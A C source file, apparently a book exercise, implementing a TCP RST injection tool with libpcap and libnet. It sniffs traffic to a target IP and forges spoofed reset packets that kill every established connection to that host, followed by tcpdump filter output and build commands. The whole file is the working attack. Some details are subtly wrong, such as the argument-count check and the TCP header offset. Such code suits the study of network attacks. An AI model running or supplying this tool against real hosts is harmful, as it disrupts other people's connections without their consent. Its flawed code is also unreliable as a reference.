#include <libnet.h>
#include <pcap.h>
#include "../chapter02/hacking.h"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

struct data_pass {
  int libnet_handle;
  u_char *packet;
};
int main(int argc, char *argv[]) {
  struct pcap_pkthdr cap_header;
  const u_char *packet, *pkt_data;
  pcap_t *pcap_handle;
  char errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE
  char *device;
  u_long target_ip;
  int network;
  struct data_pass critical_libnet_data;

  if (argc < 1) {
    printf("Usage: %s <target IP>\n", argv[0]);
    exit(0);
  }

  target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);
  if (target_ip == -1)
    fatal("Invalid target address");

  device = pcap_lookupdev(errbuf);
  if  (device == NULL)
    fatal(errbuf);

  pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
  if (pcap_handle == NULL)
    fatal(errbuf);

  critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);
  if(critical_libnet_data.libnet_handle == -1)
    libnet_error(EXIT_FAILURE, "can't open network interface. -- this program must run as root.\n");

  libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));
  if (critical_libnet_data.packet == NULL)
    libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

  libnet_seed_prand();

  set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

  printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
  pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);
  pcap_close(pcap_handle);
}

/* Sets a packet filter to look for established TCP connections to target_ip */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip) {
  struct bpf_program filter;
  char filter_string[100];

  sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));

  printf("DEBUG: filter string is \'%s\'\n", filter_string);
  if (pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)
    fatal("pcap_compile failed");

  if (pcap_setfilter(pcap_hdl, &filter) == -1)
    fatal("pcap_setfilter failed");
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
  u_char *pkt_data;
  struct libnet_ip_hdr *IPhdr;
  struct libnet_tcp_hdr *TCPhdr;
  struct data_pass *passed;
  int bcount;

  passed = (struct data_pass *) user_args; // Pass data using a pointer to a struct.

  IPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);
  TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

  printf("resetting TCP connection from %s:%d ",
  inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
  printf("<---> %s:%d\n", inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));

  libnet_build_ip(LIBNET_TCP_H, // Size of the packet sans IP header
    IPTOS_LOWDELAY, // IP tos
    libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)
    0, // Frag stuff
    libnet_get_prand(LIBNET_PR8), // TTL (randomized)
    IPPROTO_TCP, // Transport protocol
    *((u_long *)&(IPhdr->ip_dst)), // Source IP (pretend we are dst)
    *((u_long *)&(IPhdr->ip_src)), // Destination IP (send back to src)
    NULL, // Payload (none)
    0, // Payload length
    passed->packet); // Packet header memory

  libnet_build_tcp(htons(TCPhdr->th_dport), // Source TCP port (pretend we are dst)
    htons(TCPhdr->th_sport), // Destination TCP port (send back to src)
    htonl(TCPhdr->th_ack), // Sequence number (use previous ack)
    libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)
    TH_RST, // Control flags (RST flag set only)
    libnet_get_prand(LIBNET_PRu16), // Window size (randomized)
    0, // Urgent pointer
    NULL, // Payload (none)
    0, // Payload length
    (passed->packet) + LIBNET_IP_H); // Packet header memory
  
  if (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
    libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

  bcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IP_H+LIBNET_TCP_H);
  if (bcount < LIBNET_IP_H + LIBNET_TCP_H)
    libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.");

  usleep(5000); // pause slightly
}

/*

apt install tcpdump -y

tcpdump -d "dst host 192.168.42.88"
(000) ldh      [12]
(001) jeq      #0x800           jt 2	jf 4
(002) ld       [30]
(003) jeq      #0xc0a82a58      jt 8	jf 9
(004) jeq      #0x806           jt 6	jf 5
(005) jeq      #0x8035          jt 6	jf 9
(006) ld       [38]
(007) jeq      #0xc0a82a58      jt 8	jf 9
(008) ret      #262144
(009) ret      #0

tcpdump -dd "dst host 192.168.42.88"
{ 0x28, 0, 0, 0x0000000c },
{ 0x15, 0, 2, 0x00000800 },
{ 0x20, 0, 0, 0x0000001e },
{ 0x15, 4, 5, 0xc0a82a58 },
{ 0x15, 1, 0, 0x00000806 },
{ 0x15, 0, 3, 0x00008035 },
{ 0x20, 0, 0, 0x00000026 },
{ 0x15, 0, 1, 0xc0a82a58 },
{ 0x6, 0, 0, 0x00040000 },
{ 0x6, 0, 0, 0x00000000 },

tcpdump -ddd "dst host 192.168.42.88"
10
40 0 0 12
21 0 2 2048
32 0 0 30
21 4 5 3232246360
21 1 0 2054
21 0 3 32821
32 0 0 38
21 0 1 3232246360
6 0 0 262144
6 0 0 0

------------------------------

apt install libpcap-dev libnet-dev -y
gcc -g rst_hijack.c -o rst_hijack.out $(libnet-config --defines) -lnet -lpcap

# obsolete

*/
